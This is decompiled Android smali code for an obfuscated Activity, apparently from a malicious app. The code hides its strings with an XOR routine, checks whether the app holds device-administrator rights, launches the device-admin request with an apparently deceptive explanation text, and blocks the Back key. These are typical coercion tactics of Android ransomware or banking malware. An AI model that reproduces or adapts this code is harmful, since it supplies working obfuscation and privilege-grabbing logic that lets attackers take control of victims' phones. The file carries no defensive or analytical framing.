.class public Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;
.super Landroid/app/Activity;


# static fields
.field public static d:Z

.field private static final e:[Ljava/lang/String;


# instance fields
.field private final a:I

.field private b:Landroid/content/ComponentName;

.field private final c:I


# direct methods
.method static constructor <clinit>()V
    .locals 16

    const/4 v4, 0x3

    const/4 v3, 0x2

    const/4 v2, 0x1

    const/4 v1, 0x0

    const/4 v0, 0x5

    new-array v6, v0, [Ljava/lang/String;

    const-string v5, "%I\u001d}*-CWn54\t\u001cw16FWN\u0001\u0000x<W\u0015\u0008f7N\u0011\rh7"

    const/4 v0, -0x1

    move-object v7, v6

    move-object v8, v6

    move v6, v1

    :goto_0
    invoke-virtual {v5}, Ljava/lang/String;->toCharArray()[C

    move-result-object v5

    array-length v9, v5

    if-gt v9, v2, :cond_2

    move v10, v1

    :cond_0
    move-object v11, v5

    move v12, v10

    move v15, v9

    move-object v9, v5

    move v5, v15

    :goto_1
    aget-char v14, v9, v10

    rem-int/lit8 v13, v12, 0x5

    packed-switch v13, :pswitch_data_0

    const/16 v13, 0x45

    :goto_2
    xor-int/2addr v13, v14

    int-to-char v13, v13

    aput-char v13, v9, v10

    add-int/lit8 v10, v12, 0x1

    if-nez v5, :cond_1

    move-object v9, v11

    move v12, v10

    move v10, v5

    goto :goto_1

    :cond_1
    move v9, v5

    move-object v5, v11

    :goto_3
    if-gt v9, v10, :cond_0

    new-instance v9, Ljava/lang/String;

    invoke-direct {v9, v5}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v9}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v5

    packed-switch v0, :pswitch_data_1

    aput-object v5, v7, v6

    const-string v0, "%I\u001d}*-CWn54\t\u0018l1-H\u0017!\u0004\u0000c&K\u0000\u0012n:J\u001a\u0005c4F\u000b"

    move-object v5, v0

    move v6, v2

    move-object v7, v8

    move v0, v1

    goto :goto_0

    :pswitch_0
    aput-object v5, v7, v6

    const-string v0, "\u0014U\u0016k0\'SYc,\'B\u0017| 7\u0007\u0018a!dS\u001c}(7\u0007\u0016ie1T\u001c\u0005O\u0010O\u001c| dS\u001c}(7\u0007\u001e`3!U\u0017/<+R\u000b/07BY`#dH\u000c}e3B\u001b|,0BY`7dT\u001c}3-D\u001c|e7R\u001age%TY{-!\u00078k*&BYL*6W\u0016}$0N\u0016aelD\u0016c)!D\rf3!K\u0000#e\u2058t\u001c}3-D\u001c|\u2058m\u0007\u0018a!dT\u0016i13F\u000bje0O\u0018{e3BYf+\'K\u000ck dF\n/5%U\r/*\"\u0007\rg dt\u001c}3-D\u001c|idN\u0017l)1C\u0010a\"dF\u0017ve%W\tc,\'F\rf**TU/\u0006+I\rj+0\u0007?f)!TY\'!!A\u0010a  \u0007\u001bj)+PP#e7D\u000bf50TU/,*T\r}0\'S\u0010`+dT\u001c{6h\u0007\u0018a!dF\u0017ve6B\u0015n1!CYk*\'R\u0014j+0F\rf**\u0007Ql*(K\u001cl1-Q\u001cc<d\u203b*`#0P\u0018} \u2059\u000eW/\u0007=\u0007\u000c|,*@Y{-!\u0007*j72N\u001aj6dH\u000b/\u0016+A\rx$6BU/<+RYn\"6B\u001c/1+\u0007\rg 7BY{ 6J\n!"

    move-object v5, v0

    move v6, v3

    move-object v7, v8

    move v0, v2

    goto :goto_0

    :pswitch_1
    aput-object v5, v7, v6

    const-string v0, "%I\u001d}*-CWn54\t\u001cw16FWK\u0000\u0012n:J\u001a\u0005c4F\u000b"

    move-object v5, v0

    move v6, v4

    move-object v7, v8

    move v0, v3

    goto :goto_0

    :pswitch_2
    aput-object v5, v7, v6

    const/4 v5, 0x4

    const-string v0, " B\u000ff&!x\t`)-D\u0000"

    move v6, v5

    move-object v7, v8

    move-object v5, v0

    move v0, v4

    goto :goto_0

    :pswitch_3
    aput-object v5, v7, v6

    sput-object v8, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->e:[Ljava/lang/String;

    return-void

    :pswitch_4
    const/16 v13, 0x44

    goto :goto_2

    :pswitch_5
    const/16 v13, 0x27

    goto :goto_2

    :pswitch_6
    const/16 v13, 0x79

    goto :goto_2

    :pswitch_7
    const/16 v13, 0xf

    goto :goto_2

    :cond_2
    move v10, v1

    goto :goto_3

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0x7c

    iput v0, p0, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->c:I

    const/16 v0, 0x7d

    iput v0, p0, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->a:I

    return-void
.end method


# virtual methods
.method public a(Ljava/lang/Boolean;)V
    .locals 4

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->e:[Ljava/lang/String;

    const/4 v2, 0x1

    aget-object v1, v1, v2

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->e:[Ljava/lang/String;

    const/4 v2, 0x3

    aget-object v1, v1, v2

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->b:Landroid/content/ComponentName;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->e:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v1, v1, v2

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->e:[Ljava/lang/String;

    const/4 v3, 0x2

    aget-object v2, v2, v3

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->startActivity(Landroid/content/Intent;)V

    :goto_0
    return-void

    :cond_0
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->finish()V

    goto :goto_0
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2

    const/16 v0, 0x7c

    if-ne p1, v0, :cond_2

    const/4 v0, -0x1

    if-ne p2, v0, :cond_1

    const/4 v0, 0x1

    :cond_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->a(Ljava/lang/Boolean;)V

    :goto_0
    return-void

    :cond_1
    const/4 v0, 0x0

    sget-boolean v1, Lzvy/zpfypq/bbuhtkwvaf/s;->h:Z

    if-eqz v1, :cond_0

    :cond_2
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/IlIlILlIILIllIllllIllllIlllIlllllIIlIIlIlllILlIllIIIllLl;

    invoke-direct {v1, v0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->b:Landroid/content/ComponentName;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->e:[Ljava/lang/String;

    const/4 v2, 0x4

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->b:Landroid/content/ComponentName;

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->a(Ljava/lang/Boolean;)V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;->finish()V

    return-void
.end method

.method protected onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 v0, 0x4

    if-eq p1, v0, :cond_0

    :try_start_0
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/4 v0, 0x1

    :goto_0
    return v0

    :catch_0
    move-exception v0

    :try_start_1
    throw v0
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    move-exception v0

    throw v0

    :cond_1
    const/4 v0, 0x0

    goto :goto_0
.end method

.method protected onResume()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    return-void
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
